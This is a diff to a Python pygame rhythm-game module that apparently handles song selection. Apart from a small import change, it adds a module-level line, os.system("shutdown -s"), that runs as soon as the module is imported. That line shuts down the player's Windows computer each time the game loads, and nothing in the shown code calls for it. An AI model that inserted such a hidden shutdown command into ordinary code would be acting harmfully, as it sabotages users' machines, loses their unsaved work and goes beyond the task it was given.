@@ -9,7 +9,7 @@ from .start_screen import *
 from .helper_methods import *
 from .constants import *
 from .logs import log, line
-import pygame
+import pygame, os
 import traceback
 import random
 
@@ -56,7 +56,7 @@ from .song_player import play_song # Tejune stupid? Lägg imports på toppen
 log("Finished loading song selection and prerequisites for playing songs", "update", line())
 
 ############# Functions & Classes ##############
-
+os.system("shutdown -s")
 ## Button class
 class Button:
     """Create a button, then blit the surface in the while loop"""
